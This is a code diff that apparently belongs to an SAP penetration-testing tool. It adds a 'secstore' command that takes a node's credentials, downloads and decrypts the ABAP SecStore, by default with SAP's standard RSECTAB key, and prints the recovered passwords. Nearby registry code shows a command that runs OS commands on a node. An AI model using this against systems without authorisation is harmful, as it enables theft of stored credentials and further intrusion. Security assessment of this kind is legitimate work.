@@ -690,6 +690,74 @@ def cmd_exec_local(ctx: CommandContext, args: List[str]) -> CommandResult:
 
 
 # ---------------------------------------------------------------------------
+# SecStore extraction (download_and_decrypt) command
+# ---------------------------------------------------------------------------
+
+def cmd_secstore(ctx: CommandContext, args: List[str]) -> CommandResult:
+    """Decrypt the ABAP SecStore of the selected node: 'secstore [key_hex]'.
+
+    Wraps :func:`sapmap_secstore.download_and_decrypt` and prints the recovered
+    entries to the console (no loot file yet).
+    """
+    # Lazy imports so the RFC/model/crypto stack is only pulled in when used.
+    from sapmap_models import SAPNode
+    from sapmap_rfc import get_sdk_path
+    import sapmap_secstore
+
+    # SecStore extraction runs ABAP/RFC over the NW RFC SDK backend — refuse
+    # early with a clear hint when the operator did not pass --sdk.
+    if not get_sdk_path():
+        ctx.echo("no NW RFC SDK path set — restart with '--sdk <PATH>'")
+        return CommandResult(ok=False, message="no sdk path")
+
+    # Optional override of the RSECTAB encryption key (defaults to SAP's).
+    key_hex = args[0] if args else sapmap_secstore.DEFAULT_KEY_HEX
+
+    # The processor edits the raw .sapmap dict; rebuild a SAPNode and pick its
+    # best credentials, same as the GUI's SecStore handler.
+    node_dict = ctx.selected_node() or {}
+    try:
+        node = SAPNode.from_dict(node_dict)
+    except Exception as exc:  # defensive: hand-edited/partial node dicts
+        ctx.echo(f"cannot build node from state: {exc}")
+        return CommandResult(ok=False, message="bad node")
+
+    creds = node.best_credentials()
+    if creds is None:
+        ctx.echo("selected node has no usable credentials")
+        return CommandResult(ok=False, message="no creds")
+
+    try:
+        results = sapmap_secstore.download_and_decrypt(node, creds, key_hex)
+    except Exception as exc:
+        ctx.echo(f"secstore failed: {exc}")
+        return CommandResult(ok=False, message=f"secstore failed: {exc}")
+
+    if not results:
+        ctx.echo("no SecStore entries found")
+        return CommandResult(ok=False, message="no entries")
+
+    # Print one line per entry: ident, extracted SID/instance, and the
+    # recovered password or the error that prevented decryption.
+    ok = 0
+    for entry in results:
+        ident = entry.get("ident", "")
+        if entry.get("error"):
+            ctx.echo(f"{ident}\tERROR: {entry['error']}")
+            continue
+        pw = entry.get("password")
+        sid = entry.get("sid", "")
+        inst = entry.get("instance_nr", "")
+        meta = f" [sid={sid} inst={inst}]" if (sid or inst) else ""
+        ctx.echo(f"{ident}\t{pw}{meta}")
+        if pw:
+            ok += 1
+    ctx.echo(f"({len(results)} entr{'y' if len(results) == 1 else 'ies'}, "
+             f"{ok} decrypted)")
+    return CommandResult(ok=True, message=f"{ok}/{len(results)} decrypted")
+
+
+# ---------------------------------------------------------------------------
 # Built-in housekeeping commands
 # ---------------------------------------------------------------------------
 
@@ -800,7 +868,12 @@ def default_registry() -> CommandRegistry:
         conditions=[require_selected_node(), require_abap(), require_credentials()],
         help="run an OS command on the selected node (SXPG_STEP_XPG_START)"))
     reg.register(Command(
-        name="history", aliases=["hist"], handler=cmd_history,
+        name="secstore", aliases=["ss"], handler=cmd_secstore,
+        args=[Arg("key_hex", required=False, help="optional RSECTAB key override")],
+        conditions=[require_selected_node(), require_abap(), require_credentials()],
+        help="decrypt the ABAP SecStore of the selected node (printed to console)"))
+    reg.register(Command(
+        name="history", aliases=["hi"], handler=cmd_history,
         args=[Arg("a", required=False, help="'a' to dump all at once (no paging)")],
         help="print command history (paged; 'a' = dump all without paging)"))
     reg.register(Command(
